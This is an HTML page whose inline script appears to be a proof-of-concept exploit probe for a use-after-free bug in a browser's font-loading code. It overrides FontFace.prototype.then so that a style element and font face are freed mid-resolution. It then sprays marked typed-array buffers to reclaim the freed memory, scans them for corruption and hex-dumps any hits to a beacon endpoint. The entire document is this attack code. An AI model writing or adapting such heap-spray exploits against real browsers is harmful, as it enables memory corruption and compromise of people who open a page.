<!doctype html><html><head><meta charset="utf-8"><title>p584</title>
<script>
function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
function hexByte(v,i){var x=v[i];return ('0'+(x===undefined?0:x).toString(16)).slice(-2)}
function dump(v,n){var s='';for(var i=0;i<n;i++)s+=hexByte(v,i);return s}
var SIZE = 80, K = 64;
var styleEl=null, firedHere=false, MAP=[], scanned=false;
function scan(tag){
  if (scanned) return; scanned = true;
  for (var i=0;i<MAP.length;i++){
    var v=MAP[i], nz=0, first=-1;
    for (var o=0;o<SIZE;o++){
      if (o>=0x10 && o<=0x12) continue;
      if (v[o]) { nz++; if (first<0) first=o; }
    }
    if (nz){ b('P584-'+tag+'-HIT-b'+i+'-nz'+nz+'-first'+first+'-'+dump(v,80)); return; }
  }
  b('P584-'+tag+'-NOHIT-'+MAP.length);
}
function setup(){
  var A=new FontFace('f0','local(Helvetica)',{unicodeRange:'U+0041'});
  document.fonts.add(A); void A.loaded; window.__alive=[A];
  styleEl=document.createElement('style');
  styleEl.textContent="@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }";
  document.head.appendChild(styleEl);
  b('P584-SETUP');
  firedHere=false;
  Object.defineProperty(FontFace.prototype,'then',{
    configurable:true,
    get:function(){
      if (firedHere) return undefined;
      firedHere=true;
      if (styleEl) styleEl.remove();
      try { document.fonts.delete(this); } catch(e){}
      styleEl=null;
      document.body.offsetHeight;
      MAP=[];
      for (var k=0;k<K;k++){
        var v=new Uint8Array(new ArrayBuffer(SIZE));
        v[0x10]=0xBB; v[0x11]=0x00; v[0x12]=k;
        MAP.push(v);
      }
      b('P584-SPRAYED-'+MAP.length);
      try { document.fonts.check('1em s0'); } catch(e){}
      b('P584-CHECK-RETURNED');
      return undefined;
    },
    set:function(){}
  });
  b('P584-LOAD-CALLED');
  document.fonts.load('1em f0, s0','AB').then(function(){ b('P584-RESOLVED'); },function(){ b('P584-REJECTED'); });
  setTimeout(function(){ scan('T90'); },90);
  setTimeout(function(){ scan('T300'); },300);
  setTimeout(function(){ scan('T900'); },900);
}
function run(){ b('P584-PARSE'); setup(); }
if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
else document.addEventListener('DOMContentLoaded',run);
</script></head><body><p>p584</p></body></html>
